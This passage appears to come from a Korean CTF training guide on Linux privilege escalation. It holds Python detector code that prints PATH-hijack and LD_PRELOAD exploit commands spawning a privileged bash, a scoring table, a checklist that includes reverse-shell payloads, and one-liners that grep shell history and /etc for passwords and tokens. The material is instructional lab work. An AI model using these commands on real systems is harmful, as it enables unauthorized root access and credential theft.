                    EnvVulnerability(
                        vuln_type="PATH 하이재킹",
                        detail=(
                            f"바이너리가 '{cmd}'를 상대경로로 실행\n"
                            f"    쓰기 가능 PATH 디렉토리: {writable_path_dirs}"
                        ),
                        severity="critical",
                        exploit_example=(
                            f"mkdir /tmp/hijack && "
                            f"echo -e '#!/bin/bash\\n/bin/bash -p' > /tmp/hijack/{cmd} && "
                            f"chmod +x /tmp/hijack/{cmd} && "
                            f"export PATH=/tmp/hijack:$PATH && {binary_path}"
                        ),
                    )
                )
        else:
            for cmd in rel_cmds:
                analysis.vulnerabilities.append(
                    EnvVulnerability(
                        vuln_type="PATH 하이재킹 (부분 위험)",
                        detail=f"바이너리가 '{cmd}'를 상대경로로 실행 (현재 PATH 쓰기 불가)",
                        severity="medium",
                        exploit_example=(
                            f"export PATH=/tmp/hijack:$PATH 설정 후 "
                            f"/tmp/hijack/{cmd} 악성 스크립트 생성"
                        ),
                    )
                )

    # LD_PRELOAD 취약성
    ld_preload = env_vars.get("LD_PRELOAD", "")
    if ld_preload:
        analysis.ld_preload_vulnerable = True
        analysis.vulnerabilities.append(
            EnvVulnerability(
                vuln_type="LD_PRELOAD 설정됨",
                detail=f"LD_PRELOAD={ld_preload} — 악성 라이브러리 로드 가능",
                severity="high",
                exploit_example=(
                    "gcc -shared -fPIC -o /tmp/evil.so evil.c && "
                    f"LD_PRELOAD=/tmp/evil.so {binary_path}"
                ),
            )
        )

    return analysis


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="환경변수 취약점 탐지기 — PATH 하이재킹 및 LD_PRELOAD 분석",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  %(prog)s --binary /usr/local/bin/backup
  %(prog)s --binary /usr/sbin/service --env-file /tmp/target.env
  %(prog)s --binary /opt/app/run.sh
        """,
    )
    parser.add_argument(
        "--binary",
        required=True,
        help="분석할 바이너리 또는 스크립트 경로",
    )
    parser.add_argument(
        "--env-file",
        default="",
        help="환경변수 파일 경로 (key=value 형식, 미지정 시 현재 환경 사용)",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    if not Path(args.binary).exists():
        print(f"[-] 파일을 찾을 수 없습니다: {args.binary}")
        raise SystemExit(1)

    print(f"[*] 바이너리 분석: {args.binary}")

    env_vars = parse_env_file(args.env_file) if args.env_file else dict(os.environ)
    analysis = analyze_binary(args.binary, env_vars)

    print("\n" + "=" * 60)
    print("환경변수 취약점 분석 결과")
    print("=" * 60)
    print(f"대상: {analysis.binary_path}")
    print(f"상대경로 명령: {analysis.relative_commands or '없음'}")
    print(f"LD_PRELOAD 취약: {'예' if analysis.ld_preload_vulnerable else '아니오'}")
    print(f"\n총 취약점: {len(analysis.vulnerabilities)}개")

    for vuln in analysis.vulnerabilities:
        print(f"\n[{vuln.severity.upper()}] {vuln.vuln_type}")
        print(f"  상세: {vuln.detail}")
        print(f"  익스플로잇: {vuln.exploit_example}")

    if not analysis.vulnerabilities:
        print("[+] 환경변수 관련 취약점이 발견되지 않았습니다.")


if __name__ == "__main__":
    main()
```

---

## 6. 점수표 및 학습 체크리스트

### 6.1 CTF 점수표

| 문제 번호 | 유형 | 배점 | 난이도 | 예상 소요 시간 |
|-----------|------|------|--------|----------------|
| 문제 1 | SUID 바이너리 남용 | 100점 | 하 | 10~20분 |
| 문제 2 | sudo 미스설정 | 150점 | 중 | 15~30분 |
| 문제 3 | Cron 파일 쓰기 남용 | 200점 | 중 | 20~40분 |
| 문제 4 | 환경변수 PATH 하이재킹 | 250점 | 상 | 30~60분 |
| 보너스 | 커널 익스플로잇 | 300점 | 최상 | 60분+ |
| **합계** | | **1000점** | | |

### 6.2 단계별 학습 체크리스트

#### 기초 단계 (문제 1 해결 목표)
- [ ] `find` 명령어로 SUID 파일 탐색 가능
- [ ] GTFOBins 웹사이트 사용법 숙지
- [ ] 파일 권한 표기법 (rwxrwxrwx, 8진수) 이해
- [ ] `ls -la` 출력에서 SUID 비트 식별

#### 중급 단계 (문제 2, 3 해결 목표)
- [ ] `sudo -l` 출력 해석 능력
- [ ] sudoers 파일 구조 이해
- [ ] crontab 문법 이해 (분 시 일 월 요일)
- [ ] 리버스 쉘 페이로드 생성 및 사용
- [ ] `netcat`으로 리스너 설정

#### 고급 단계 (문제 4 해결 목표)
- [ ] `strings` 명령으로 바이너리 분석
- [ ] PATH 환경변수 동작 원리 이해
- [ ] 악성 쉘 스크립트 작성 및 배치
- [ ] LD_PRELOAD 동작 원리 이해
- [ ] C 언어로 공유 라이브러리 컴파일

#### 전문가 단계 (보너스 해결 목표)
- [ ] 커널 버전별 취약점 식별
- [ ] `searchsploit` 활용 숙달
- [ ] 익스플로잇 코드 컴파일 및 수정
- [ ] 메모리 보호 기법 우회 이해

### 6.3 참고 도구 및 리소스

| 도구/리소스 | 용도 | URL/명령 |
|-------------|------|----------|
| GTFOBins | SUID/sudo 익스플로잇 DB | gtfobins.github.io |
| LinPEAS | 자동 열거 도구 | github.com/carlospolop/PEASS-ng |
| LinEnum | 자동 열거 스크립트 | github.com/rebootuser/LinEnum |
| pwncat | 리버스 쉘 핸들러 | `pip install pwncat-cs` |
| searchsploit | 취약점 DB 검색 | `searchsploit linux kernel 5.4` |
| pspy | 실시간 프로세스 모니터 | github.com/DominicBreuker/pspy |

### 6.4 빠른 참조 명령어 모음

```bash
# === 권한 상승 열거 원라이너 ===

# SUID 전체 탐색
find / -perm -4000 2>/dev/null | xargs ls -la

# Capabilities 탐색
getcap -r / 2>/dev/null

# sudo 권한
sudo -l

# 쓰기 가능 중요 파일
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# 쓰기 가능 디렉토리
find / -writable -type d 2>/dev/null | grep -v proc

# 현재 사용자 그룹 확인
id; groups

# 네트워크 서비스 (로컬 접근 가능한 것)
ss -tulnp | grep 127.0.0.1

# 환경변수 전체 출력
env | sort

# 히스토리에서 비밀번호 힌트 찾기
history | grep -i "pass\|secret\|key\|token"

# 설정 파일에서 비밀번호 탐색
grep -r "password" /etc/ 2>/dev/null | grep -v Binary
```
